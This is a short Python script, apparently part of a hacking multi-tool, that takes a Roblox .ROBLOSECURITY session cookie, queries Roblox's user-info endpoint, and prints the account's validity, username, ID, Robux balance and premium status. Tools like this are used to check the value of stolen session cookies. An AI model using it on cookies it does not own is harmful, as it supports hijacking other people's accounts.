#!/usr/bin/env python3
# GNU GENERAL PUBLIC LICENSE
# See the file 'LICENSE' for details
# ---------------------------------------------------------------------
# EN:
#     - Touch or modify the code below. If there is an error,
#     - please fix it and make a pull request ;)
from configs.util import *
from configs.term import *
from configs.config import *

try:
    import requests
    import json
except Exception as e:
    ErrorModule(e)

Title("Roblox Cookie Info")

try:
    user_agent = ChoiceUserAgent()
    headers = {"User-Agent": user_agent}

    print(
        f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Selected User-Agent: {white + user_agent}"
    )
    cookie = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Cookie -> {white}")
    print(
        f"{BEFORE + current_time_hour() + AFTER} {WAIT} Information Recovery..{reset}"
    )
    try:
        response = requests.get(
            "https://www.roblox.com/mobileapi/userinfo",
            headers=headers,
            cookies={".ROBLOSECURITY": cookie},
        )
        api = json.loads(response.text)
        status = "Valid"
        username_roblox = api.get("UserName", "None")
        user_id_roblox = api.get("UserID", "None")
        robux_roblox = api.get("RobuxBalance", "None")
        premium_roblox = api.get("IsPremium", "None")
        avatar_roblox = api.get("ThumbnailUrl", "None")
        builders_club_roblox = api.get("IsAnyBuildersClubMember", "None")
    except:
        status = "Invalid"
        username_roblox = "None"
        user_id_roblox = "None"
        robux_roblox = "None"
        premium_roblox = "None"
        avatar_roblox = "None"
        builders_club_roblox = "None"

    print(
        f"""
    {INFO_ADD} Status        : {white}{status}{blue}
    {INFO_ADD} Username      : {white}{username_roblox}{blue}
    {INFO_ADD} Id            : {white}{user_id_roblox}{blue}
    {INFO_ADD} Robux         : {white}{robux_roblox}{blue}
    {INFO_ADD} Premium       : {white}{premium_roblox}{blue}
    {INFO_ADD} Builders Club : {white}{builders_club_roblox}{blue}
    {INFO_ADD} Avatar        : {white}{avatar_roblox}{blue}
    """
    )
    Continue()

except Exception as e:
    Error(e)
